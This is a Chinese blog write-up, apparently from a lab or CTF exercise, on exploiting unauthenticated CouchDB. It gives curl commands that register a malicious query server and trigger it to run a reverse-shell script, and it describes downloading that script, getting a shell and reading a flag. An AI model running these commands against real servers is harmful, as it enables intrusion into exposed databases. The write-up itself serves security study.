---
layout:     keynote
title:      "Couchdb命令执行"
subtitle:   "一点点记录"
iframe:     "https://Urahara3389.github.io/js-module-7day/"
date:       2016-09-11
author:     "Urahara"
header-img: "img/Couchdb-RCE.jpg"
tags:
    - 渗透测试
    - 数据库安全
---


##背景介绍
 CouchDB是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB 可以安装在大部分 POSIX 系统上，包括 Linux和 Mac OS X。

##漏洞介绍
Couchdb默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。

使用nmap扫描可发现couchdb的banner信息
[couchdb默认端口](img/Couchdb-RCE-nmap.png)

>执行命令需要使用admin权限，如果数据库存在未授权则可直接利用，若有账号认证则需要想办法获取admin的密码，当然可通过burpsuit去爆破
[账号认证](img/Couchdb-RCE-admin.png)

##漏洞利用
使用admin身份登录后获取cookie
[图片]
>远程命令执行示例

`curl -X PUT 'http://192.168.199.181:5984/_config/query_servers/cmd' -d '"python /tmp/back.py"'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"`

`curl -X PUT 'http://192.168.199.181:5984/teeest'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"`

`curl -X PUT 'http://192.168.199.181:5984/teeest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"`

`curl -X POST 'http://192.168.199.181:5984/teeest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"`

远程下载反弹脚本
[图片]
成功监听到下载请求
[图片]
添加执行权限
[图片]
执行反弹脚本
[图片]
getshell，读取flag
[图片]
